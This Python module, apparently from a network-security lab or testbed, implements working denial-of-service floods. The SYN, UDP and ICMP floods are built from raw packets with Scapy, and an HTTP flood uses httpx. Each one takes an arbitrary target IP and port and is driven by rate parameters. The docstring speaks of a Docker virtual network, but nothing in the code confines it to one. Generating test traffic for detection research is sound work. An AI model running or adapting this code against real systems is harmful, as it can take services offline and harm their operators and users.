"""
DDoS attack module — SYN flood, UDP flood, ICMP flood, HTTP flood.

All attacks use Scapy to craft raw packets on the Docker virtual network.
Each function runs for `duration` seconds, respecting `rate_multiplier`.
"""

from __future__ import annotations

import logging
import random
import time

from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort, RandString

log = logging.getLogger(__name__)

# ── Dispatch ─────────────────────────────────────────────

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown DDoS sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── SYN Flood ────────────────────────────────────────────

@_register("syn_flood")
def syn_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """TCP SYN flood — half-open connections to exhaust target's SYN backlog."""
    base_rate = params.get("packet_rate", 1000)
    pps = int(base_rate * rate_multiplier)
    pkt_size = params.get("packet_size", 64)
    delay = 1.0 / max(pps, 1)

    log.info("SYN flood → %s:%d at ~%d pps for %.0fs", target_ip, target_port, pps, duration)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        batch_size = min(pps, 100)  # send in bursts
        pkts = [
            IP(dst=target_ip) /
            TCP(
                sport=RandShort(),
                dport=target_port,
                flags="S",
                seq=random.randint(0, 2**32 - 1),
            ) /
            Raw(load=RandString(size=max(0, pkt_size - 40)))
            for _ in range(batch_size)
        ]
        send(pkts, verbose=False, inter=delay)
        packets_sent += batch_size
        # Pace to roughly match target pps
        time.sleep(max(0, batch_size / max(pps, 1) - 0.01))

    return {"packets_sent": packets_sent, "attack": "syn_flood", "pps_target": pps}


# ── UDP Flood ────────────────────────────────────────────

@_register("udp_flood")
def udp_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """UDP packet flood — saturate bandwidth with random datagrams."""
    base_rate = params.get("packet_rate", 2000)
    pps = int(base_rate * rate_multiplier)
    pkt_size = params.get("packet_size", 512)
    delay = 1.0 / max(pps, 1)

    log.info("UDP flood → %s:%d at ~%d pps for %.0fs", target_ip, target_port, pps, duration)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        batch_size = min(pps, 100)
        pkts = [
            IP(dst=target_ip) /
            UDP(sport=RandShort(), dport=target_port) /
            Raw(load=RandString(size=max(0, pkt_size - 28)))
            for _ in range(batch_size)
        ]
        send(pkts, verbose=False, inter=delay)
        packets_sent += batch_size
        time.sleep(max(0, batch_size / max(pps, 1) - 0.01))

    return {"packets_sent": packets_sent, "attack": "udp_flood", "pps_target": pps}


# ── ICMP Flood ───────────────────────────────────────────

@_register("icmp_flood")
def icmp_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """ICMP echo request flood (ping flood)."""
    base_rate = params.get("packet_rate", 1500)
    pps = int(base_rate * rate_multiplier)
    pkt_size = params.get("packet_size", 64)

    log.info("ICMP flood → %s at ~%d pps for %.0fs", target_ip, pps, duration)

    packets_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        batch_size = min(pps, 100)
        pkts = [
            IP(dst=target_ip) /
            ICMP(type=8, code=0) /
            Raw(load=RandString(size=max(0, pkt_size - 28)))
            for _ in range(batch_size)
        ]
        send(pkts, verbose=False)
        packets_sent += batch_size
        time.sleep(max(0, batch_size / max(pps, 1) - 0.01))

    return {"packets_sent": packets_sent, "attack": "icmp_flood", "pps_target": pps}


# ── HTTP Flood ───────────────────────────────────────────

@_register("http_flood")
def http_flood(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """Layer 7 HTTP flood — complete TCP handshake + HTTP request."""
    import httpx

    base_rate = params.get("request_rate", 500)
    rps = int(base_rate * rate_multiplier)
    method = params.get("method", "GET").upper()
    path = params.get("path", "/")
    delay = 1.0 / max(rps, 1)

    url = f"http://{target_ip}:{target_port}{path}"
    log.info("HTTP flood %s %s at ~%d rps for %.0fs", method, url, rps, duration)

    requests_sent = 0
    errors = 0
    deadline = time.time() + duration

    with httpx.Client(timeout=2, follow_redirects=False) as client:
        while time.time() < deadline:
            try:
                if method == "POST":
                    client.post(url, content=b"x" * 512)
                else:
                    client.get(url)
                requests_sent += 1
            except Exception:
                errors += 1
                requests_sent += 1  # still counts as traffic generated
            time.sleep(delay)

    return {
        "packets_sent": requests_sent,
        "attack": "http_flood",
        "rps_target": rps,
        "errors": errors,
    }
